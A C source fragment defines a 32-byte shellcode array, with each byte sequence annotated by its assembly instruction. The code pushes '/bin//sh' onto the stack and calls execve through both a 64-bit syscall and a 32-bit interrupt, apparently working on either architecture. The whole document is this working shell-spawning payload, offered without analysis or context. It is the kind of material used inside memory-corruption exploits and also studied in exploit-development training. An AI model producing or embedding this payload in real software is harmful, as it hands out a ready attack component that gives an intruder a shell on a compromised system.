
#define SHX_SIZE 32

char SHX[] = {
  /* 0000 */ "\x31\xf6"             /* xor esi, esi    */
  /* 0002 */ "\xf7\xe6"             /* mul esi         */
  /* 0004 */ "\x52"                 /* push edx        */
  /* 0005 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f */
  /* 000A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f */
  /* 000F */ "\x54"                 /* push esp        */
  /* 0010 */ "\x5b"                 /* pop ebx         */
  /* 0011 */ "\x53"                 /* push ebx        */
  /* 0012 */ "\x5f"                 /* pop edi         */
  /* 0013 */ "\x40"                 /* inc eax         */
  /* 0014 */ "\x75\x04"             /* jnz 0x1a        */
  /* 0016 */ "\xb0\x3b"             /* mov al, 0x3b    */
  /* 0018 */ "\x0f\x05"             /* syscall         */
  /* 001A */ "\x31\xc9"             /* xor ecx, ecx    */
  /* 001C */ "\xb0\x0b"             /* mov al, 0xb     */
  /* 001E */ "\xcd\x80"             /* int 0x80        */
};